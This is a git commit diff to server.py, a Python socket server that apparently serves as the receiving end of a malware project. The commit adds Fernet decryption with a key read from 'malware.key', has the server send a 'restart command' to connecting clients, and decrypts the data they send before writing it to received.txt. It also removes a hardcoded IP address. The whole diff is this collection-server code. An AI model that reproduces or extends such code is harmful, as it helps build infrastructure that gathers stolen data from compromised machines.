d6bd5890b24a19d47f436f410ef25da16e0aa77a
Fryderyk200 <146193454+Fryderyk200@users.noreply.github.com>
2024-04-14 18:20:54 +0100

    Update server.py

--- server.py
+++ server.py
@@ -1,7 +1,18 @@
 import socket
-HOST = '100.84.214.6'
+from cryptography.fernet import Fernet
+HOST = ''
 PORT = 9090
 FILE_NAME = 'received.txt'
+
+def load_key():
+    return open("malware.key", "rb").read()
+
+#decrypt message
+def decrypt_message(encrypted_message):
+    key = load_key()
+    f = Fernet(key)
+    decrypted_message = f.decrypt(encrypted_message)
+    return decrypted_message.decode()
 
 def handle_client_connection(conn):
     received_data = conn.recv(1024).decode('utf-8')
@@ -11,12 +22,22 @@ def handle_client_connection(conn):
     conn.sendall(response_message.encode('utf-8'))
     print("Sent restart command to client.")
 
-    with open(FILE_NAME, 'wb') as f:
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                break
-            f.write(data)
+    #decrypt data
+    encrypted_data = bytearray()
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        encrypted_data.extend(data)
+
+    try:
+        decrypted_data = decrypt_message(bytes(encrypted_data))
+        with open(FILE_NAME, "w") as f:
+            f.write(decrypted_data)
+        print("Decrypted data")
+    except Exception as e:
+        print(f"Failed to decrypt data: {e}")
+
 
 ##sockets
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -30,8 +51,3 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
         with conn:
             handle_client_connection(conn)
-
-        with open(FILE_NAME, 'rb') as f:
-            contents = f.read().decode('utf-8')
-            print(contents)
-
